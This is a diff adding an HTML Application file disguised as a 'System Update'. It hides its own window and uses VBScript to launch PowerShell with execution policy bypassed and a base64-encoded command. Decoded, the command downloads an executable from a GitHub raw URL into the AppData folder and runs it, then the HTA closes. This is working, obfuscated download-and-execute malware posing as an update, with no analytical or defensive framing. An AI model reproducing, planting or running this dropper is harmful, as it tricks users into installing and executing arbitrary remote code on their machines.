@@ -1,0 +1,25 @@
+<html>
+<head>
+    <title>System Update</title>
+    <HTA:APPLICATION 
+        ID="oHTA"
+        APPLICATIONNAME="AppExec"
+        BORDER="none"
+        BORDERSTYLE="none"
+        CAPTION="no"
+        SHOWINTASKBAR="no"
+        SINGLEINSTANCE="yes"
+        SYSMENU="no"
+        WINDOWSTATE="minimize">
+</head>
+<body>
+    <script language="VBScript">
+        Option Explicit
+        
+        Dim ShellApp
+        Set ShellApp = CreateObject("Shell.Application")
+        ShellApp.ShellExecute "powershell.exe", "-NoProfile -ExecutionPolicy Bypass -EncodedCommand " & "CgAgACAAIAAgAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADIACgAgACAAIAAgACQAcABhAHQAaAAgAD0AIAAiACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAVABlAHMAdAAuAGUAeABlACIACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAE0AbwBvAG8AbgB1AHgALwBNAG8AbwBvAG4AdQB4AFYAZQByAGkAZgB5AC8AcgBhAHcALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAGkAbgAvAFQAZQBzAHQALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAJABwAGEAdABoAAoAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAcABhAHQAaAAKACAAIAAgACAA", "", "", 0
+        Self.Close
+    </script>
+</body>
+</html>
